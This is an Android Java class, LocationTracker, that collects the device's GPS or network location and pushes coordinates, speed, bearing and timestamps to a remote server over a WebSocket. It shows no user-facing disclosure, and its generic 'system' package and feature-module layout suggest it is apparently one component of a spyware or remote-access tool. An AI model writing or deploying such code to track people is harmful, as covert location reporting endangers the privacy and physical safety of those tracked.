package com.xrc.system.features;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONException;
import org.json.JSONObject;

public class LocationTracker {
    private static final String TAG = Constants.TAG + ":Loc";
    private static LocationTracker instance;
    private final Context ctx;
    private final LocationManager lm;
    private final Handler handler;

    private LocationTracker(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        this.handler = new Handler(Looper.getMainLooper());
    }

    public static synchronized LocationTracker get(Context ctx) {
        if (instance == null) {
            instance = new LocationTracker(ctx);
        }
        return instance;
    }

    public void fetchAndSend() {
        try {
            Location gps = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location net = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            Location best = gps != null ? gps : net;

            if (best == null) {
                requestSingleUpdate();
                return;
            }

            sendLocation(best);
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission denied", e);
        }
    }

    private void requestSingleUpdate() {
        try {
            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocation(location);
                    lm.removeUpdates(this);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, null);
            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, null);
            handler.postDelayed(() -> lm.removeUpdates(listener), 30000);
        } catch (SecurityException e) {
            Log.e(TAG, "Single update failed", e);
        }
    }

    private void sendLocation(Location loc) {
        try {
            JSONObject data = new JSONObject();
            data.put("lat", loc.getLatitude());
            data.put("lon", loc.getLongitude());
            data.put("accuracy", loc.getAccuracy());
            data.put("altitude", loc.getAltitude());
            data.put("speed", loc.getSpeed());
            data.put("bearing", loc.getBearing());
            data.put("provider", loc.getProvider());
            data.put("time", loc.getTime());
            WebSocketClient.get(ctx).sendEvent("location", data);
        } catch (JSONException e) {
            Log.e(TAG, "Location JSON failed", e);
        }
    }
}
